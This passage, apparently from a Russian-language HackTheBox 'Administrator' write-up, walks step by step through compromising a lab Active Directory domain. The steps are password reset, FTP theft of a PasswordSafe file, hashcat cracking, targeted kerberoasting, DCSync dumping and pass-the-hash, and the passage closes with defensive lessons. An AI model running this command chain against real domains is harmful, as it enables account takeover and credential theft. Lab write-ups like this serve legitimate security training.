+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span>benjamin<span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span>-U<span class="w"> </span>administrator.htb/michael%<span class="s1">'Password123!'</span><span class="w"> </span>-S<span class="w"> </span><span class="m">10</span>.129.58.233
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.233<span class="w"> </span>-u<span class="w"> </span><span class="s1">'benjamin'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Password123!'</span>
+<span class="go">SMB         10.129.58.233   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) </span>
+<span class="gp gp-VirtualEnv">(signing:True)</span> <span class="go">(SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.58.233   445    DC               [+] administrator.htb\benjamin:Password123!</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Опять же, в выводе <code>NetExec</code> мы можем заметить, что у нас теперь есть доступ к юзеру <code>benjamin</code>. Я просмотрел информацию об этом юзере в <code>BloodHound</code> и не нашёл больше ничего примечательного. После недолгих размышлений я вспомнил, что у нас есть открытый <code>21 (ftp)</code> порт, к которому до этого у нас не было никакого доступа. Я решил попробовать аутентифицироваться с помощью юзера <code>benjamin</code>, и у меня получилось.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="5:2"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio"><input id="__tabbed_5_2" name="__tabbed_5" type="radio"><div class="tabbed-labels"><label for="__tabbed_5_1">FTP Authentication</label><label for="__tabbed_5_2">FTP Files</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>ftp<span class="w"> </span><span class="m">10</span>.129.58.233
+<span class="go">Connected to 10.129.58.233.</span>
+<span class="go">220 Microsoft FTP Service</span>
+<span class="go">Name (10.129.58.233:root): benjamin</span>
+<span class="go">331 Password required</span>
+<span class="go">Password: </span>
+<span class="go">230 User logged in.</span>
+<span class="go">Remote system type is Windows_NT.</span>
+<span class="go">ftp&gt; </span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="go">ftp&gt; ls</span>
+<span class="go">229 Entering Extended Passive Mode (|||57921|)</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">10-05-24  09:13AM                  952 Backup.psafe3</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">ftp&gt; bin</span>
+<span class="go">200 Type set to I.</span>
+<span class="go">ftp&gt; get Backup.psafe3</span>
+<span class="go">local: Backup.psafe3 remote: Backup.psafe3</span>
+<span class="go">229 Entering Extended Passive Mode (|||57926|)</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">100% |************************************************************|   952       59.66 KiB/s    00:00 ETA</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">952 bytes received in 00:00 (59.38 KiB/s)</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>После аутентификации я обнаружил файл <code>Backup.psafe3</code>. Я забрал его на свой хост. Это файл, хранящий в себе учетные данные, которые можно просмотреть в приложении <code>PasswordSafe</code>. Но для начала придется подобрать пароль. У <code>hashcat</code> есть мод <code>5200</code>, который предназначен как раз для взлома хэшей, используемых в <code>PasswordSafe</code>, нам достаточно просто передать ему на вход этот файл и наш словарь (я использовал <code>rockyou.txt</code>).</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="6:1"><input checked="checked" id="__tabbed_6_1" name="__tabbed_6" type="radio"><div class="tabbed-labels"><label for="__tabbed_6_1">hashcat</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>hashcat<span class="w"> </span>-a0<span class="w"> </span>-m5200<span class="w"> </span>Backup.psafe3<span class="w"> </span>rockyou.txt
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Результат работы <code>hashcat</code> вы можете увидеть на скриншоте ниже под спойлером.</p>
+<details class="note">
+<summary>Результат работы <code>hashcat</code></summary>
+<figure id="__screenshot_4">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/hashcat_psafe3.webp" data-desc-position="bottom"><img alt="Результат работы hashcat" src="../images/administrator/hashcat_psafe3.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 4:</span> Результаты работы <code>hashcat</code></p>
+</figcaption>
+</figure>
+</details>
+<p>После взлома хэша мы открываем данный файл в <code>PasswordSafe</code>, вводим полученный пароль и получаем учетные данные 3 пользователей домена, юзернеймы которых мы видели ранее при перечислении домена с помощью <code>NetExec</code>.</p>
+<details class="note">
+<summary>Учетные данные</summary>
+<figure id="__screenshot_5">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/credentials_psafe.webp" data-desc-position="bottom"><img alt="Учетные данные в PasswordSafe" src="../images/administrator/credentials_psafe.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 5:</span> Учетные данные в PasswordSafe</p>
+</figcaption>
+</figure>
+</details>
+<p>Самым интересным с точки зрения дальнейшего продвижения оказался юзер <code>emily</code> по двум причинам. Первой из них является то, что этот юзер имеет разрешение <code>GenericWrite</code> в отношении юзера <code>ethan</code>, что видно в <code>BloodHound</code>.</p>
+<details class="note">
+<summary>GenericWrite (emily --&gt; ethan)</summary>
+<figure id="__screenshot_6">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/bloodhound_emily_to_ethan.webp" data-desc-position="bottom"><img alt="GenericWrite (emily --&gt; ethan)" src="../images/administrator/bloodhound_emily_to_ethan.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 6:</span> GenericWrite (emily --&gt; ethan)</p>
+</figcaption>
+</figure>
+</details>
+<p>А второй весомой причиной является то, что юзер <code>ethan</code> обладает разрешением <code>DCSync</code> в отношении контроллера домена! А это значит, что получив доступ к нему, мы можем сдампить все хэши и добраться до учетной записи администратора.</p>
+<details class="note">
+<summary>DCSync (ethan)</summary>
+<figure id="__screenshot_7">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/bloodhound_ethan_dcsync.webp" data-desc-position="bottom"><img alt="DCSync (ethan)" src="../images/administrator/bloodhound_ethan_dcsync.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 7:</span> DCSync (ethan)</p>
+</figcaption>
+</figure>
+</details>
+<p>Для начала заберем пароль юзера <code>emily</code> из <code>PasswordSafe</code>.</p>
+<details class="note">
+<summary>Пароль <code>emily</code></summary>
+<figure id="__screenshot_8">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/psafe_emily_pass.webp" data-desc-position="bottom"><img alt="Пароль emily" src="../images/administrator/psafe_emily_pass.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 8:</span> Пароль <code>emily</code></p>
+</figcaption>
+</figure>
+</details>
+<p>Далее воспользуемся тулом <code>evil-winrm</code> для того, чтобы получить сессию от лица <code>emily</code> и забрать первый флаг (<code>user.txt</code>).</p>
+<details class="note">
+<summary>Flag 1 (user.txt)</summary>
+<figure id="__screenshot_9">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/user_flag.webp" data-desc-position="bottom"><img alt="Flag 1 (user.txt)" src="../images/administrator/user_flag.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 9:</span> Flag 1 (user.txt)</p>
+</figcaption>
+</figure>
+</details>
+<h2 id="t1558003-t1110002-t1003006-t1550002">Компрометация домена и второй флаг — <code>T1558.003</code>, <code>T1110.002</code>, <code>T1003.006</code>, <code>T1550.002</code><a class="headerlink" href="#t1558003-t1110002-t1003006-t1550002" title="Permanent link">¶</a></h2>
+<p>Теперь вспоминаем о наличии разрешения <code>GenericWrite</code> в отношении юзера <code>ethan</code>. В отличие от <code>GenericAll</code>, разрешение <code>GenericWrite</code> не позволяет нам напрямую сбросить пароль юзеру и установить свой. Поэтому, чтобы узнать пароль юзера <code>ethan</code>, нам необходимо будет выполнить атаку типа <code>targeted kerberoasting</code>. Для этого идеально подходит тул <code>targetedKerberoast</code>. Суть атаки заключается в том, что мы записываем SPN учетной записи, в отношении которой у нас есть разрешение, затем с помощью атаки <code>kerberoasting</code> запрашиваем tgs-билет и получаем хэш, который затем взламываем с помощью <code>hashcat</code> (или <code>john</code>). Тул <code>targetedKerberoast</code> проводит ювелирную работу: на вход ему передается контролируемая нами учетная запись (<code>emily</code>) с разрешением в отношении другой учетной записи (<code>ethan</code>); в ходе своей работы он записывает SPN всем учетным записям (<code>ethan</code>), в отношении которых есть разрешение у контролируемой нами учетной записи (<code>emily</code>), запрашивает tgs-билет, сбрасывает нам его хэш и затем удаляет ранее созданную SPN запись.</p>
+<details class="note">
+<summary>Синтаксис <code>targetedKerberoast.py</code> (ПАРОЛЬ)</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="7:1"><input checked="checked" id="__tabbed_7_1" name="__tabbed_7" type="radio"><div class="tabbed-labels"><label for="__tabbed_7_1">targetedKerberoast.py</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="go">git clone https://github.com/ShutdownRepo/targetedKerberoast</span>
+<span class="gp">$ </span>./targetedKerberoast.py<span class="w"> </span>-d<span class="w"> </span><span class="s1">'administrator.htb'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'emily'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span><span class="w"> </span>-v
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</details>
+<p>В результате работы <code>targetedKerberoast</code> мы получаем хэш tgs-билета.</p>
+<details class="note">
+<summary>Результат работы <code>targetedKerberoast</code></summary>
+<figure id="__screenshot_10">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/targetedKerberoast_result.webp" data-desc-position="bottom"><img alt="Результат работы targetedKerberoast" src="../images/administrator/targetedKerberoast_result.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 10:</span> Результат работы <code>targetedKerberoast</code></p>
+</figcaption>
+</figure>
+</details>
+<p>Данный хэш сохраним в файл с произвольным именем и затем передадим <code>hashcat</code> для взлома, используя <code>-m13100</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="8:1"><input checked="checked" id="__tabbed_8_1" name="__tabbed_8" type="radio"><div class="tabbed-labels"><label for="__tabbed_8_1">hashcat</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>hashcat<span class="w"> </span>-a0<span class="w"> </span>-m13100<span class="w"> </span>tgs.hash<span class="w"> </span>rockyou.txt
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Хэш был успешно взломан и в итоге мы получили пароль юзера <code>ethan</code>.</p>
+<details class="note">
+<summary>Результат работы <code>hashcat</code></summary>
+<figure id="__screenshot_11">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/tgs_hash_ethan.webp" data-desc-position="bottom"><img alt="Результат работы hashcat" src="../images/administrator/tgs_hash_ethan.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 11:</span> Результат работы <code>hashcat</code></p>
+</figcaption>
+</figure>
+</details>
+<p>Дальнейший наш путь лежит к учетной записи <code>Administrator</code> на контроллере домена. Учитывая, что у юзера <code>ethan</code> есть разрешение <code>DCSync</code>, мы можем просто сдампить все хэши с помощью <code>secretsdump</code>. </p>
+<details class="note">
+<summary>Синтаксис <code>secretsdump.py</code> (ПАРОЛЬ)</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="9:1"><input checked="checked" id="__tabbed_9_1" name="__tabbed_9" type="radio"><div class="tabbed-labels"><label for="__tabbed_9_1">secretsdump.py</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>secretsdump.py<span class="w"> </span>administrator.htb/ethan:limpbizkit@DC.administrator.htb
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</details>
+<p>В результате работы <code>secretsdump</code> мы получаем все имеющиеся хэши, в том числе хэш администратора, который мы будем использовать в ходе <code>Pass-the-Hash</code>, чтобы получить сессию от его лица и забрать второй флаг.</p>
+<details class="note">
+<summary>Дамп хэшей</summary>
+<figure id="__screenshot_12">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/administrator_hash.webp" data-desc-position="bottom"><img alt="Дамп хэшей" src="../images/administrator/administrator_hash.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 12:</span> Дамп хэшей</p>
+</figcaption>
+</figure>
+</details>
+<p>Для получения сессии мы воспользуемся тулом <code>evil-winrm</code> с флагом <code>-H</code> для того, чтобы выполнить <code>Pass-the-Hash</code> (предоставить для аутентификации NTLM хэш вместо пароля в открытом виде).</p>
+<details class="note">
+<summary>Flag 2 (root.txt)</summary>
+<figure id="__screenshot_13">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/root_flag.webp" data-desc-position="bottom"><img alt="Flag 2 (root.txt)" src="../images/administrator/root_flag.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 13:</span> Flag 2 (root.txt)</p>
+</figcaption>
+</figure>
+</details>
+<h2 id="_3">Извлеченные уроки<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<ol>
+<li><strong>Аудит прав делегирования (ACL)</strong>. В ходе исследования домена были обнаружены разрешения у рядовых пользователей, которые позволяли управлять чужими паролями и атрибутами (<code>GenericAll</code>, <code>GenericWrite</code>, <code>ForceChangePassword</code>). Именно эти разрешения сделали возможной всю цепочку от <code>olivia</code> до <code>ethan</code>. Не будь этих разрешений у рядовых пользователей, а только у специально выделенных учетных записей, продвижение по домену было бы очень затруднительным.</li>
+<li><strong>Защита чувствительных данных</strong>. Стоит помнить, что хранилище учетных данных не является панацеей, тем-более, если база этого хранилища находится на открытом FTP-сервере (<code>Backup.psafe3</code>). Если бы в ходе перечисления обнаружить эту базу не удалось, то выполненное перемещение <code>benjamin</code> --&gt; <code>emily</code> могло не состояться ввиду отсутствия пароля от учетной записи <code>emily</code>.</li>
+<li><strong>Ограничение прав DCSync</strong>. Права на репликацию должны быть строго ограничены только серверами контроллеров домена. Рядовые учетные записи (<code>ethan</code>) не должны иметь к ним доступа. Именно наличие подобного права у пользователя <code>ethan</code> привело к полной компрометации всего домена. </li>
+</ol>
+<h2 id="_4">Источники<a class="headerlink" href="#_4" title="Permanent link">¶</a></h2>
+<ol>
+<li><a href="https://www.hackingarticles.in/genericall-active-directory-abuse/"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> Abusing AD-DACL: Generic ALL Permissions от Aarti Singh</a></li>
+<li><a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> Abusing AD-DACL: ForceChangePassword от Pradnya Pawar</a></li>
+<li><a href="https://github.com/ShutdownRepo/targetedKerberoast"><img alt="🛠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f6e0.svg" title=":tools:"> targetedKerberoast.py от Charlie Bromberg</a></li>
+</ol>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="17 сентября 2026 г. 09:50:59 MSK">17 сентября 2026 г. 09:50:59</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="17 сентября 2026 г. 09:50:59 MSK">17 сентября 2026 г. 09:50:59</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.follow", "header.autohide"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
